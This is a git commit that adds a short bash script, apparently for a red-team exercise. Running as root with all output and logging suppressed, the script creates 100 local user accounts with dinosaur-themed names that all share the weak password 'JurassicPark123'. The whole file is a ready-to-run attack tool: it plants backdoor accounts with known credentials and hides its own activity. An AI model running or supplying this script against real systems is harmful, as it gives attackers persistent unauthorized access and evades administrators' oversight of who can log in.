af9997841666dfc295c09ecb18d5107a2c878636
JWilliams1694 <97634368+JWilliams1694@users.noreply.github.com>
2025-04-02 19:09:17 -0400

    Add files via upload

---
+++ CreateDinos.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+# Red Team User Flooding Script (Stealth Mode)
+# Description: This script creates a large number of user accounts with weak credentials without displaying output
+# Author: [Your Name or Email]
+
+# Default values
+NUM_USERS=100  # Number of users to create
+USERNAME_LIST=("t_rex" "velociraptor" "triceratops" "stegosaurus" "spinosaurus" "brachiosaurus" "dilophosaurus" "pteranodon" "ankylosaurus" "compy" "mosasaurus" "gallimimus" "allosaurus" "carnotaurus" "pachycephalosaurus")
+DEFAULT_PASSWORD="JurassicPark123"
+
+# Suppress output and logging
+exec &>/dev/null
+
+# Create users in bulk
+for i in $(seq 1 $NUM_USERS); do
+    USERNAME="${USERNAME_LIST[$((i % ${#USERNAME_LIST[@]}))]}$i"
+    useradd -m -p $(openssl passwd -1 "$DEFAULT_PASSWORD") "$USERNAME" 2>/dev/null
+
+done
